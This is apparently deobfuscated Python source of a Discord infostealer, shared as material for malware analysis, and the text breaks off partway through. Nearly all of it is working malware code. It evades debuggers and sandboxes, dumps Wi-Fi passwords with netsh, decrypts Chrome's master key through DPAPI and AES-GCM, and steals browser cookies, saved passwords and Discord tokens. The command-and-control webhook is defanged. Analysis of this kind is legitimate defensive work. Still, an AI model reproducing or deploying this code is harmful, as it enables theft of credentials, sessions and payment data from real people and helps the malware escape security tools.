# Author: tdinh
# Decoded by: tdinh cute
# Target: input/main.py (Discord Infostealer / Token Grabber)
# Original Obfuscation: SONATA_II v0.1 + PPVM (Pickle Python Virtual Machine by ngocuyencoder/bmhien)
# Description: Fully deobfuscated clean source code for educational and malware analysis purposes.

import os
import re
import sys
import json
import time
import base64
import shutil
import random
import string
import atexit
import socket
import struct
import ctypes
import sqlite3
import platform
import subprocess
from datetime import datetime, timezone
from threading import Lock, Semaphore
from concurrent.futures import ThreadPoolExecutor, as_completed

# Optional imports handled by _auto_install
try:
    from Crypto.Cipher import AES
except ImportError:
    AES = None

try:
    import win32crypt
except ImportError:
    win32crypt = None

try:
    import winreg
except ImportError:
    winreg = None

try:
    import requests
except ImportError:
    requests = None


def _auto_install():
    """Automatically install missing packages before they are imported."""
    required = [
        ('Crypto', 'pycryptodome'),
        ('win32crypt', 'pywin32'),
        ('requests', 'requests'),
        ('psutil', 'psutil'),
        ('wmi', 'wmi'),
        ('tzlocal', 'tzlocal')
    ]
    for mod, pkg in required:
        try:
            __import__(mod)
        except ImportError:
            try:
                subprocess.run(
                    [sys.executable, '-m', 'pip', 'install', pkg, '--quiet', '--disable-pip-version-check'],
                    check=False
                )
            except Exception:
                pass


# String Obfuscator
class Obfuscator:
    _KEY_POOL = [
        [127, 155, 61, 229, 76, 162, 111, 216, 21, 142, 113, 74, 179, 108, 217, 226],
        [189, 73, 204, 15, 92, 231, 48, 167, 110, 25, 134, 83, 242, 59, 178, 3],
        [42, 215, 88, 171, 14, 199, 66, 249, 122, 35, 158, 77, 220, 93, 184, 7],
        [201, 54, 147, 82, 239, 16, 175, 98, 31, 214, 69, 186, 43, 228, 105, 160]
    ]

    @staticmethod
    def _xor_multi(data: bytes, keys: list) -> bytes:
        result = bytearray(data)
        for i, b in enumerate(data):
            result[i] = b ^ keys[i % len(keys)]
        return bytes(result)

    @staticmethod
    def _roll(data: bytes, direction: int) -> bytes:
        result = bytearray(len(data))
        for i, b in enumerate(data):
            if direction > 0:
                result[i] = ((b << 3) & 0xFF) | (b >> 5)
            else:
                result[i] = ((b >> 3) & 0xFF) | ((b << 5) & 0xFF)
        return bytes(result)

    @classmethod
    def decode(cls, encoded: str) -> str:
        raw = base64.b64decode(encoded)
        key_id = raw[0]
        keys = cls._KEY_POOL[key_id % len(cls._KEY_POOL)]
        rolled_data = raw[1:]
        unrolled = cls._roll(rolled_data, -1)
        xored = cls._xor_multi(unrolled, keys)
        return xored.decode('utf-8', errors='ignore')

    @classmethod
    def encode(cls, text: str) -> str:
        key_id = 0
        keys = cls._KEY_POOL[key_id]
        data = text.encode('utf-8')
        xored = cls._xor_multi(data, keys)
        rolled = cls._roll(xored, 1)
        result = bytes([key_id]) + rolled
        return base64.b64encode(result).decode('ascii')


# Configuration & IOCs (DEFANGED)
_WH_B64 = "COvXKNEGsrdu2JdyNBmGWLezD+ArluCFbkD3+mwZbiBd0f0q4wzyD5ZyHVDmy6SybxHlQuvkELW9UV9S7NCc+k27juHAFgGdxXHnSwTzfkG0Ab9K04d5nIXhzkq2EV7ifYPfSng8CJ00iMc6RjmOyg0xfhqZ3mhvJaA="
# Original C2 Webhook (DEFANGED - HTTP 403 Forbidden by Discord):
# hxxps[://]discord[.]com/api/webhooks/1462280187956957297/noUUpwxV10qb_MRqLjZQgTe2mGN5y80CCJRCBt3ni3weu8E4mjdncz-ks6y3A2yha4Fk
WEBHOOK_URL = ""  # Defanged: set to empty to prevent any network exfiltration
_DEBUG = True
MAX_COOKIE_AGE_YEARS = 3

ALLOWED_DOMAINS = [
    'discord.com', 'discordapp.com', 'discord.gg', 'discord.media', 'discord.net',
    'google.com', 'youtube.com', 'github.com', 'twitter.com', 'x.com',
    'reddit.com', 'facebook.com', 'instagram.com', 'tiktok.com', 'netflix.com',
    'spotify.com', 'twitch.tv', 'patreon.com', 'onlyfans.com', 'gmail.com',
    'accounts.google.com', 'mail.google.com', 'steam.com', 'steampowered.com',
    'steamcommunity.com', 'roblox.com', 'epicgames.com', 'paypal.com',
    'venmo.com', 'cash.app', 'amazon.com', 'ebay.com'
]


def log(msg: str):
    """Debug logger."""
    if _DEBUG:
        try:
            print(f"[DEBUG] {msg}")
        except Exception:
            pass


def domain_matches(host: str, allowed_domain: str) -> bool:
    """
    Proper domain suffix matching.
    'discord.com' matches 'discord.com', 'ptb.discord.com', 'cdn.discord.com'
    But does NOT match 'evil-discord.com' or 'discord-malware.xyz'
    """
    if not host or not allowed_domain:
        return False
    host = host.lower().strip()
    allowed_domain = allowed_domain.lower().strip()
    if host == allowed_domain:
        return True
    if host.endswith('.' + allowed_domain):
        return True
    return False


# Thread-Safe Collections
class SafeSet:
    def __init__(self):
        self._set = set()
        self._lock = Lock()

    def add(self, item):
        with self._lock:
            self._set.add(item)

    def get_all(self):
        with self._lock:
            return list(self._set)

    def __len__(self):
        with self._lock:
            return len(self._set)


class SafeList:
    def __init__(self):
        self._list = []
        self._lock = Lock()

    def add(self, item):
        with self._lock:
            self._list.append(item)

    def get_all(self):
        with self._lock:
            return list(self._list)

    def __len__(self):
        with self._lock:
            return len(self._list)


# Anti-Analysis / Sandbox / Debugger Evasion
class AntiDetect:
    DEBUGGER_PROCS = [
        'x64dbg.exe', 'x32dbg.exe', 'windbg.exe', 'ollydbg.exe', 'ida.exe', 'ida64.exe',
        'idag.exe', 'idag64.exe', 'dnspy.exe', 'de4dot.exe', 'ilspy.exe', 'cheatengine.exe',
        'cheat engine.exe', 'reclass.exe', 'reclass.net.exe', 'immunitydebugger.exe'
    ]

    SANDBOX_PROCS = [
        'vboxservice.exe', 'vboxtray.exe', 'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe',
        'VGAuthService.exe', 'vmacthlp.exe', 'xenservice.exe', 'qemu-ga.exe', 'prl_cc.exe',
        'prl_tools.exe', 'procmon.exe', 'procmon64.exe', 'procexp.exe', 'procexp64.exe',
        'wireshark.exe', 'dumpcap.exe', 'rawshark.exe', 'ollydbg.exe', 'x64dbg.exe',
        'x32dbg.exe', 'windbg.exe', 'ida.exe', 'ida64.exe', 'idag.exe', 'idag64.exe',
        'httpdebugger.exe', 'fiddler.exe', 'charles.exe', 'petool.exe', 'lordpe.exe',
        'stud_pe.exe', 'regmon.exe', 'regmon64.exe', 'windump.exe', 'tcpview.exe',
        'tcpview64.exe', 'processhacker.exe', 'processhacker64.exe', 'autoruns.exe',
        'autoruns64.exe', 'apimonitor.exe', 'api monitor.exe', 'sandboxie.exe',
        'sbiesvc.exe', 'dnspy.exe', 'de4dot.exe', 'vmsrvc.exe', 'vmusrvc.exe',
        'joeboxcontrol.exe', 'joeboxserver.exe', 'sniffer.exe', 'netmon.exe',
        'hookexplorer.exe', 'hookmon.exe', 'pestudio.exe', 'pebear.exe',
        'resourcehacker.exe', 'restorator.exe', 'tcpdump.exe', 'windump.exe'
    ]

    VMWARE_REG_PATHS = [
        'SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000',
        'SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000\\DriverDesc'
    ]

    VM_MACS = [
        '00:0C:29', '00:50:56', '00:05:69', '08:00:27', '00:15:5D',
        '00:03:FF', '00:1C:42', '52:54:00', '0A:00:27', '00:21:F6'
    ]

    VM_NETWORK_ADAPTERS = [
        'VirtualBox Host-Only', 'VMware Virtual Ethernet', 'VMnet', 'Hyper-V Virtual Ethernet'
    ]

    VM_PRODUCT_IDS = [
        'virtualbox', 'vmware', 'qemu', 'xen', 'bochs', 'parallels', 'hyper-v', 'kvm', 'oracle vm'
    ]

    VM_REG_KEYS = [
        ('SYSTEM\\CurrentControlSet\\Services\\disk\\Enum', 'IDE'),
        ('HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0', 'Identifier'),
        ('SYSTEM\\CurrentControlSet\\Services\\VBoxGuest', 'Start'),
        ('SYSTEM\\CurrentControlSet\\Services\\VBoxMouse', 'Start'),
        ('SYSTEM\\CurrentControlSet\\Services\\VBoxSF', 'Start'),
        ('SYSTEM\\CurrentControlSet\\Services\\VMware', 'Start'),
        ('SYSTEM\\CurrentControlSet\\Services\\VMnetAdapter', 'Start'),
        ('SYSTEM\\CurrentControlSet\\Services\\vmicheartbeat', 'Start'),
        ('SYSTEM\\CurrentControlSet\\Services\\vmicy', 'Start'),
        ('SYSTEM\\CurrentControlSet\\Services\\xenevtchn', 'Start'),
        ('SYSTEM\\CurrentControlSet\\Services\\xenacpi', 'Start'),
        ('SYSTEM\\CurrentControlSet\\Services\\prl_par', 'Start'),
        ('SYSTEM\\CurrentControlSet\\Services\\prl_eth', 'Start')
    ]

    def __init__(self):
        self._detected = False
        self._reasons = []
        self._start_time = time.time()
        self._delay_min = random.uniform(0.05, 0.1)
        self._delay_max = random.uniform(0.2, 0.5)
        self._check_count = 0

    def _random_delay(self):
        time.sleep(random.uniform(self._delay_min, self._delay_max))

    def _normalize_mac(self, mac: str) -> str:
        return ':'.join(p.zfill(2).upper() for p in mac.replace('-', ':').split(':'))

    def _check_mac(self) -> bool:
        try:
            import wmi
            c = wmi.WMI()
            for interface in c.Win32_NetworkAdapterConfiguration(IPEnabled=True):
                mac = interface.MACAddress
                if mac:
                    mac_norm = self._normalize_mac(mac)
                    for vm_mac in self.VM_MACS:
                        if mac_norm.startswith(vm_mac):
                            self._reasons.append(f"VM MAC: {mac}")
                            return True
            for adapter in c.Win32_NetworkAdapter():
                adapter_name = adapter.Name or ""
                for vm_net in self.VM_NETWORK_ADAPTERS:
                    if vm_net.lower() in adapter_name.lower():
                        self._reasons.append(f"VM Network Adapter: {adapter_name}")
                        return True
        except Exception:
            pass
        return False

    def _check_processes(self) -> bool:
        all_bad_procs = set(p.lower() for p in self.DEBUGGER_PROCS + self.SANDBOX_PROCS)
        proc_names = []
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                try:
                    pname = proc.info['name']
                    if pname:
                        proc_names.append(pname.lower())
                except Exception:
                    pass
        except ImportError:
            try:
                output = subprocess.check_output(['tasklist', '/fo', 'csv', '/nh'], stderr=subprocess.DEVNULL)
                for line in output.decode(errors='ignore').splitlines():
                    parts = line.split(',')
                    if parts:
                        proc_names.append(parts[0].strip('"').lower())
            except Exception:
                pass

        for pname in proc_names:
            if pname in all_bad_procs:
                self._reasons.append(f"Suspicious Process: {pname}")
                return True
        return False

    def _check_debugger(self) -> bool:
        try:
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                self._reasons.append("IsDebuggerPresent() == True")
                return True

            is_debugged = ctypes.c_bool(False)
            if hasattr(kernel32, 'CheckRemoteDebuggerPresent'):
                kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(is_debugged))
                if is_debugged.value:
                    self._reasons.append("CheckRemoteDebuggerPresent() == True")
                    return True

            # PEB BeingDebugged check via NtQueryInformationProcess
            ntdll = ctypes.windll.ntdll
            if hasattr(ntdll, 'NtQueryInformationProcess'):
                pbi_size = 48 if struct.calcsize("P") == 8 else 24
                pbi_buffer = ctypes.create_string_buffer(pbi_size)
                ret = ntdll.NtQueryInformationProcess(
                    kernel32.GetCurrentProcess(),
                    0,  # ProcessBasicInformation
                    pbi_buffer,
                    pbi_size,
                    ctypes.byref(ctypes.c_ulong(0))
                )
                if ret == 0:
                    peb_addr = struct.unpack_from("P", pbi_buffer.raw, 4 if struct.calcsize("P") == 4 else 8)[0]
                    flag_bytes = ctypes.c_byte()
                    bytes_read = ctypes.c_size_t(0)
                    flag_offset = 2  # BeingDebugged offset
                    kernel32.ReadProcessMemory(
                        kernel32.GetCurrentProcess(),
                        ctypes.c_void_p(peb_addr + flag_offset),
                        ctypes.byref(flag_bytes),
                        1,
                        ctypes.byref(bytes_read)
                    )
                    if flag_bytes.value != 0:
                        self._reasons.append("PEB BeingDebugged == True")
                        return True
        except Exception:
            pass
        return False

    def _check_hardware(self) -> bool:
        try:
            import psutil
            logical_cpus = psutil.cpu_count(logical=False)
            if logical_cpus and logical_cpus < 2:
                self._reasons.append(f"Low CPU cores: {logical_cpus}")
                return True

            mem = psutil.virtual_memory().total / (1024 ** 3)
            if mem < 3.5:
                self._reasons.append(f"Low RAM: {mem:.1f} GB")
                return True

            uptime_seconds = time.time() - psutil.boot_time()
            if uptime_seconds < 600:  # Uptime < 10 mins
                self._reasons.append(f"Short Uptime: {uptime_seconds:.0f}s")
                return True
        except ImportError:
            pass
        return False

    def _check_screen_resolution(self) -> bool:
        try:
            user32 = ctypes.windll.user32
            w = user32.GetSystemMetrics(0)
            h = user32.GetSystemMetrics(1)
            if w < 1024 or h < 768:
                self._reasons.append(f"Low screen resolution: {w}x{h}")
                return True
        except Exception:
            pass
        return False

    def _check_disk_artifacts(self) -> bool:
        vm_files = [
            r'C:\Windows\System32\Drivers\vmmouse.sys',
            r'C:\Windows\System32\Drivers\vm3dgl.dll',
            r'C:\Windows\System32\Drivers\vmdx.dll',
            r'C:\Windows\System32\Drivers\vmusb.sys',
            r'C:\Windows\System32\vboxhook.dll',
            r'C:\Windows\System32\vboxoglerect.pas',
            r'C:\Windows\System32\vboxdisp.dll',
            r'C:\Windows\System32\vboxgl.dll',
            r'C:\Windows\System32\vboxcuda.dll',
            r'C:\Windows\System32\Drivers\hgfs.sys',
            r'C:\Program Files\VMware\VMware Tools\vmtoolsd.exe',
            r'C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxTray.exe'
        ]
        for fpath in vm_files:
            if os.path.exists(fpath):
                self._reasons.append(f"VM Artifact file: {fpath}")
                return True
        return False

    def _check_disk_size_anomaly(self) -> bool:
        try:
            kernel32 = ctypes.windll.kernel32
            for letter in ['C:\\', 'D:\\', 'E:\\']:
                total = ctypes.c_ulonglong(0)
                free = ctypes.c_ulonglong(0)
                if kernel32.GetDiskFreeSpaceExW(letter, None, ctypes.byref(total), ctypes.byref(free)):
                    total_gb = total.value / (1024 ** 3)
                    if letter == 'C:\\' and total_gb < 50.0:
                        self._reasons.append(f"Suspicious small C: drive ({total_gb:.1f} GB)")
                        return True
        except Exception:
            pass
        return False

    def _check_env_vars(self) -> bool:
        sandbox_vars = ['VBOX', 'VMWARE', 'SANDBOXIE', 'SBIE', 'QEMU', 'VIRTUALPC', 'PARALLELS', 'XEN']
        for var_name, var_value in os.environ.items():
            upper_name = var_name.upper()
            upper_val = var_value.upper()
            for sb_var in sandbox_vars:
                if sb_var in upper_name or sb_var in upper_val:
                    self._reasons.append(f"Sandbox Env Var: {var_name}")
                    return True
        return False

    def _check_username(self) -> bool:
        username = (os.getenv('USERNAME') or "").lower()
        computer = (os.getenv('COMPUTERNAMENAME') or "").lower()
        sandbox_names = ['sandbox', 'virus', 'malware', 'analysis', 'win-d99', 'cuckoo', 'cuckoo1', 'killer']
        for name in sandbox_names:
            if name in username or name in computer:
                self._reasons.append(f"Sandbox Username/Computer: {username}/{computer}")
                return True
        return False

    def _check_display_count_fast(self) -> bool:
        try:
            user32 = ctypes.windll.user32
            w = user32.GetSystemMetrics(80)  # SM_CMONITORS
            if w == 0:
                self._reasons.append("Zero display monitors")
                return True
        except Exception:
            pass
        return False

    def _check_product_id(self) -> bool:
        try:
            import wmi
            c = wmi.WMI()
            for cs in c.Win32_ComputerSystem():
                manufacturer = (cs.Manufacturer or "").lower()
                model = (cs.Model or "").lower()
                for vm_id in self.VM_PRODUCT_IDS:
                    if vm_id in manufacturer or vm_id in model:
                        self._reasons.append(f"VM Product ID: {manufacturer} {model}")
                        return True
        except Exception:
            pass
        return False

    def _check_hostname_dns(self) -> bool:
        try:
            hostname = socket.gethostname().lower()
            sandbox_patterns = [
                r'^[a-f0-9]{12}$',
                r'^sandbox',
                r'^cuckoo',
                r'^malware',
                r'^analysis',
                r'^virus[0-9]'
            ]
            for pattern in sandbox_patterns:
                if re.search(pattern, hostname):
                    self._reasons.append(f"Suspicious Hostname: {hostname}")
                    return True
        except Exception:
            pass
        return False

    def _check_registry_vm(self) -> bool:
        if not winreg:
            return False
        for reg_path, reg_val_name in self.VM_REG_KEYS:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_READ)
                value, value_type = winreg.QueryValueEx(key, reg_val_name)
                winreg.CloseKey(key)
                if value:
                    for vm_id in self.VM_PRODUCT_IDS:
                        if vm_id in str(value).lower():
                            self._reasons.append(f"VM Registry Key: {reg_path}\\{reg_val_name}")
                            return True
            except (FileNotFoundError, OSError):
                pass
        return False

    def run_all_checks(self) -> bool:
        fast_checks = [
            self._check_debugger,
            self._check_screen_resolution,
            self._check_display_count_fast,
            self._check_env_vars,
            self._check_username,
            self._check_hostname_dns,
            self._check_disk_artifacts,
            self._check_disk_size_anomaly
        ]
        deep_checks = [
            self._check_processes,
            self._check_hardware,
            self._check_mac,
            self._check_product_id,
            self._check_registry_vm
        ]
        for check in fast_checks + deep_checks:
            self._random_delay()
            if check():
                self._detected = True
                return True
        return False

    def get_reasons(self):
        return self._reasons

    def get_detected(self):
        return self._detected

    def sleep_evade(self, base_seconds: float):
        jitter = random.uniform(0.8, 1.3)
        time.sleep(max(0.1, base_seconds * jitter))

    def rate_limited_sleep(self):
        time.sleep(random.uniform(0.3, 0.7))


# System Intelligence Gathering
class SystemInfo:
    @staticmethod
    def get_installed_programs(max_entries: int = 150) -> list:
        programs = []
        reg_paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        ]
        if not winreg:
            return programs

        for hkey, path in reg_paths:
            try:
                key = winreg.OpenKey(hkey, path, 0, winreg.KEY_READ)
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if name and name not in programs:
                                programs.append(name)
                        except OSError:
                            pass
                        winreg.CloseKey(subkey)
                        if len(programs) >= max_entries:
                            break
                    except OSError:
                        continue
                winreg.CloseKey(key)
            except OSError:
                continue
        return programs

    @staticmethod
    def get_wifi_profiles() -> list:
        profiles = []
        try:
            output = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profiles'],
                stderr=subprocess.DEVNULL,
                timeout=5
            ).decode(errors='ignore')
            profile_names = []
            for line in output.splitlines():
                if ":" in line:
                    parts = line.split(":", 1)
                    if "All User Profile" in parts[0] or "Tất cả Hồ sơ Người dùng" in parts[0] or "Profil Tous les utilisateurs" in parts[0]:
                        profile_names.append(parts[1].strip())

            for name in profile_names:
                try:
                    res = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', f'name={name}', 'key=clear'],
                        stderr=subprocess.DEVNULL,
                        timeout=5
                    ).decode(errors='ignore')
                    password = "<no password set>"
                    for l in res.splitlines():
                        if ":" in l:
                            p = l.split(":", 1)
                            if any(k in p[0] for k in ["Key Content", "Nội dung Khóa", "Contenu de la clé"]):
                                password = p[1].strip()
                                break
                    profiles.append(f"SSID: {name} | Pass: {password}")
                except Exception:
                    profiles.append(f"SSID: {name} | Pass: <error>")
        except Exception:
            pass
        return profiles

    @staticmethod
    def get_all() -> dict:
        lines = []
        computer = os.getenv('COMPUTERNAMENAME', 'N/A')
        user = os.getenv('USERNAME', 'N/A')
        lines.append(f"**Computer:** `{computer}`")
        lines.append(f"**User:** `{user}`")
        lines.append(f"**OS:** `{platform.platform()}`")
        lines.append(f"**CPU Architecture:** `{platform.machine()}`")

        # Memory & Disk info
        try:
            import psutil
            mem = psutil.virtual_memory()
            lines.append(f"**RAM:** `{mem.total / (1024**3):.1f} GB` (Used: `{mem.percent}%`)")
            disk = psutil.disk_usage('C:\\')
            lines.append(f"**Disk C:** `{disk.total / (1024**3):.1f} GB` (Free: `{disk.free / (1024**3):.1f} GB`)")
            boot_ts = psutil.boot_time()
            uptime_s = int(time.time() - boot_ts)
            hours, remainder = divmod(uptime_s, 3600)
            days, hours = divmod(hours, 24)
            lines.append(f"**Uptime:** `{days}d {hours}h`")
        except Exception:
            pass

        # GPU
        try:
            import wmi
            c = wmi.WMI()
            gpus = [gpu.Name for gpu in c.Win32_VideoController() if gpu.Name]
            if gpus:
                lines.append(f"**GPU:** `{', '.join(gpus)}`")
        except Exception:
            pass

        return {
            'text': '\n'.join(lines),
            'computer': computer,
            'user': user,
            'programs': SystemInfo.get_installed_programs(),
            'wifi': SystemInfo.get_wifi_profiles()
        }


# Core Stealer Engine
class TokenResearcher:
    def __init__(self):
        self.all_tokens = SafeSet()
        self.all_webhooks = SafeSet()
        self.all_cookies = SafeList()
        self.all_passwords = SafeList()
        self.all_credit_cards = SafeList()
        self.all_phones = SafeList()
        self.all_emails = SafeSet()
        self.all_wallets = SafeSet()

        self.appdata = os.getenv('APPDATA', '')
        self.local = os.getenv('LOCALAPPDATA', '')
        self.temp_dir = os.getenv('TEMP', os.path.expanduser('~'))
        self._session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        self._temp_files = []
        self._cleanup_done = False
        self._anti = AntiDetect()
        self._api_semaphore = Semaphore(5)

        atexit.register(self._cleanup_temp)

    def _truncate_bytes(self, s: str, max_bytes: int) -> str:
        """FIXED: Truncate by bytes, not characters, to respect Discord embed limits."""
        encoded = s.encode('utf-8', errors='ignore')
        if len(encoded) <= max_bytes:
            return s
        return encoded[:max_bytes].decode('utf-8', errors='ignore')

    def _temp_path(self, prefix: str) -> str:
        rnd = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        path = os.path.join(self.temp_dir, f"{prefix}_{self._session_id}_{rnd}.tmp")
        self._temp_files.append(path)
        return path

    def _cleanup_temp(self):
        if self._cleanup_done:
            return
        self._cleanup_done = True
        for path in self._temp_files:
            self._safe_delete(path)

    def _safe_delete(self, path: str):
        if not path or not os.path.exists(path):
            return
        for _ in range(3):
            try:
                os.remove(path)
                return
            except Exception:
                time.sleep(0.1)

    def _safe_copy(self, src: str, dst: str, max_retries: int = 3) -> bool:
        for attempt in range(max_retries):
            try:
                shutil.copy2(src, dst)
                return True
            except (PermissionError, OSError):
                time.sleep(0.2)
        return False

    def get_master_key(self, path: str) -> bytes:
        """
        Get Chrome/Edge/Brave master key from Local State.
        FIXED: Multi-version support including Chrome v120+ App Bound Encryption fallback.
        """
        if not os.path.exists(path):
            return None
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                local_state = json.load(f)
            encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
            if not encrypted_key:
                return None
            enc_key_raw = base64.b64decode(encrypted_key)
            header = enc_key_raw[:5]
            if header == b'DPAPI':
                if win32crypt:
                    master_key_raw = win32crypt.CryptUnprotectData(enc_key_raw[5:], None, None, None, 0)[1]
                    return master_key_raw
            elif header == b'APPB':
                # App-Bound encryption (Chrome v127+)
                log("App-Bound encryption detected; DPAPI direct decryption unsupported without elevated broker.")
                return None
        except Exception as e:
            log(f"get_master_key error: {e}")
        return None

    def decrypt_payload(self, cipher_text, master_key: bytes) -> str:
        """
        Decrypt Chrome v10/v11 encrypted payload. Handles bytes and str input safely.
        """
        if not cipher_text or not master_key or not AES:
            return ""
        if isinstance(cipher_text, str):
            cipher_text = cipher_text.encode('latin-1', errors='ignore')
        try:
            if cipher_text.startswith(b'v10') or cipher_text.startswith(b'v11'):
                iv = cipher_text[3:15]
                payload = cipher_text[15:-16]
                tag = cipher_text[-16:]
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                decrypted = cipher.decrypt_and_verify(payload, tag)
                return decrypted.decode('utf-8', errors='ignore')
            else:
                # Legacy DPAPI fallback
                if win32crypt:
                    return win32crypt.CryptUnprotectData(cipher_text, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except Exception:
            pass
        return ""

    def get_profiles(self, base_path: str) -> list:
        """Get browser profiles. Opera/OperaGX don't have 'User Data' structure."""
        profiles = ['']
        if not os.path.exists(base_path):
            return profiles
        try:
            for item in os.listdir(base_path):
                if item == 'Default' or item.startswith('Profile '):
                    profiles.append(item)
        except Exception:
            pass
        return list(dict.fromkeys(profiles))

    def _validate_token(self, token: str) -> bool:
        """
        FIXED v4.6: Proper Discord token validation.
        - MFA tokens: mfa.<base64url> (1 dot, 80+ chars)
        - Standard tokens: X.X.X (2 dots, 3 parts, first char N/M/O)
        """
        if not token or len(token) < 50:
            return False
        valid_chars = set(string.ascii_letters + string.digits + '-_.')
        if not all(c in valid_chars for c in token):
            return False
        parts = token.split('.')
        if len(parts) == 2 and parts[0] == 'mfa':
            return len(parts[1]) >= 70
        if len(parts) == 3:
            p1 = parts[0]
            if p1 and p1[0] in 'NMO' and len(p1) in (24, 26):
                return True
        return False

    def extract_tokens_leveldb(self, base_path: str, m_key: bytes):
        """Extract Discord tokens from Chrome/Electron Local Storage leveldb files."""
        db_path = os.path.join(base_path, 'Local Storage', 'leveldb')
        if not os.path.exists(db_path):
            return
        standard_pat = re.compile(r'[MNO][A-Za-z\d]{17,26}\.[\w-]{4,8}\.[\w-]{27,45}')
        mfa_pat = re.compile(r'mfa\.[\w-]{70,120}')
        enc_pat = re.compile(r'dQw4w9WgXcQ:([a-zA-Z0-9+/=]+)')

        for file_name in os.listdir(db_path):
            if not file_name.endswith(('.log', '.ldb')):
                continue
            fpath = os.path.join(db_path, file_name)
            try:
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()

                # Find unencrypted tokens
                for match in standard_pat.finditer(content):
                    token = match.group(0)
                    if self._validate_token(token):
                        self.all_tokens.add(token)

                for match in mfa_pat.finditer(content):
                    token = match.group(0)
                    if self._validate_token(token):
                        self.all_tokens.add(token)

                # Find encrypted tokens
                if m_key:
                    for match in enc_pat.finditer(content):
                        try:
                            raw_bytes = base64.b64decode(match.group(1))
                            token = self.decrypt_payload(raw_bytes, m_key)
                            if self._validate_token(token):
                                self.all_tokens.add(token)
                        except Exception:
                            pass
            except Exception as e:
                log(f"leveldb file error: {e}")

    def extract_discord_webhooks(self, base_path: str):
        """Extract Discord webhook URLs from browser leveldb files."""
        ls_path = os.path.join(base_path, 'Local Storage', 'leveldb')
        if not os.path.exists(ls_path):
            return
        webhook_patterns = [
            re.compile(r'https?://discord(?:app)?\.com/api/webhooks/\d+/[a-zA-Z0-9_-]+'),
            re.compile(r'https?://canary\.discord(?:app)?\.com/api/webhooks/\d+/[a-zA-Z0-9_-]+'),
            re.compile(r'https?://ptb\.discord(?:app)?\.com/api/webhooks/\d+/[a-zA-Z0-9_-]+')
        ]
        for fname in os.listdir(ls_path):
            if not fname.endswith(('.log', '.ldb')):
                continue
            fpath = os.path.join(ls_path, fname)
            try:
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                for pat in webhook_patterns:
                    for match in pat.finditer(content):
                        self.all_webhooks.add(match.group(0))
            except Exception:
                pass

    def extract_cookies(self, name: str, base_path: str, m_key: bytes):
        """
        Extract cookies from Chrome/Edge/Brave/Opera cookie databases.
        Filters by ALLOWED_DOMAINS and MAX_COOKIE_AGE_YEARS.
        """
        for cookie_sub in [os.path.join('Network', 'Cookies'), 'Cookies']:
            cookie_path = os.path.join(base_path, cookie_sub)
            if not os.path.exists(cookie_path):
                continue
            tmp = self._temp_path('ck')
            if not self._safe_copy(cookie_path, tmp):
                continue
            try:
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies"
                )
                now_utc = int(time.time())
                max_age_limit = now_utc + (MAX_COOKIE_AGE_YEARS * 365 * 86400)

                for host_key, cname, path, enc_val, expires_utc, is_secure, is_httponly in cursor.fetchall():
                    if not any(domain_matches(host_key, d) for d in ALLOWED_DOMAINS):
                        continue
                    dec_val = self.decrypt_payload(enc_val, m_key)
                    if dec_val:
                        # Expiry calculation (Chromium timestamp: microseconds since 1601-01-01)
                        if expires_utc:
                            calculated = int(expires_utc / 1000000 - 11644473600)
                            if calculated > max_age_limit or calculated < 0:
                                calculated = now_utc + 86400 * 30
                        else:
                            calculated = 0

                        httponly_str = "TRUE" if is_httponly else "FALSE"
                        secure_str = "TRUE" if is_secure else "FALSE"
                        cookie_line = f"{host_key}\t{httponly_str}\t{path}\t{secure_str}\t{calculated}\t{cname}\t{dec_val}"
                        self.all_cookies.add(cookie_line)
                conn.close()
            except Exception as e:
                log(f"Cookie extraction error: {e}")
            finally:
                self._safe_delete(tmp)

    def extract_passwords(self, base_path: str, m_key: bytes):
        """Extract saved passwords from Chrome Login Data."""
        login_path = os.path.join(base_path, 'Login Data')
        if not os.path.exists(login_path):
            return
        tmp = self._temp_path('pwd')
        if not self._safe_copy(login_path, tmp):
            return
        try:
            conn = sqlite3.connect(tmp)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc_pwd in cursor.fetchall():
                if not url or not enc_pwd:
                    continue
                dec_pwd = self.decrypt_payload(enc_pwd, m_key)
                if dec_pwd:
                    self.all_passwords.add(f"URL: {url} | User: {user} | Pass: {dec_pwd}")
            conn.close()
        except Exception as e:
            log(f"passwords error: {e}")
        finally:
            self._safe_delete(tmp)

    @staticmethod
    def _luhn_check(card_num: str) -> bool:
        """Luhn algorithm validation for credit card numbers."""
        digits = [int(d) for d in card_num if d.isdigit()]
        if not digits:
            return False
        total = 0
